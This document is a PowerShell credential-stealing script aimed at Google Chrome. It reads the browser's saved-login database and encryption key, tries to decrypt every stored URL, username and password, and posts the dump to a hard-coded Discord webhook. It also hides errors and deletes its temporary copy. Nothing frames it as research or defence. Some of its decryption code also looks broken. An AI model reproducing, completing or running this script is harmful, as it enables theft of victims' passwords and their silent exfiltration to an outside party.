$ErrorActionPreference = 'SilentlyContinue'
$webhook = 'https://discord.com/api/webhooks/1369831214050971668/LJsB4cHSWVSLrhXCQGKcT8bw-ayPwZ4sqU-msbxYRoGBpG6kJRCrLM_z0XhHYB7lZ8g_'

# Chrome paths
$localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
$loginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"

# Extract encryption key
$localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
$encKeyBase64 = $localState.os_crypt.encrypted_key
$encKeyBytes = [Convert]::FromBase64String($encKeyBase64)[5..-1]
$key = [Security.Cryptography.ProtectedData]::Unprotect($encKeyBytes, $null, 0)

# Copy login data DB to temp
$tempDB = "$env:TEMP\LoginData.db"
Copy-Item $loginDataPath $tempDB -Force

# Open SQLite and extract logins
Add-Type -AssemblyName System.Data.SQLite
$conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDB;Version=3;")
$conn.Open()
$cmd = $conn.CreateCommand()
$cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
$reader = $cmd.ExecuteReader()

$results = @()
while ($reader.Read()) {
    $url = $reader.GetString(0)
    $user = $reader.GetString(1)
    $encPwd = $reader.GetValue(2)

    if ($encPwd.Length -gt 0) {
        $encBytes = $encPwd[3..($encPwd.Length - 1)]
        try {
            $dec = [Security.Cryptography.ProtectedData]::Unprotect($encBytes, $null, 0)
            $pwd = [System.Text.Encoding]::UTF8.GetString($dec)
        } catch {
            $pwd = '[ERR]'
        }

        $results += "$url | $user | $pwd"
    }
}

$conn.Close()
Remove-Item $tempDB -Force

# Send via webhook
$body = @{ content = "Chrome Dump:`n$($results -join "`n")" } | ConvertTo-Json -Depth 2
Invoke-RestMethod -Uri $webhook -Method Post -ContentType 'application/json' -Body $body
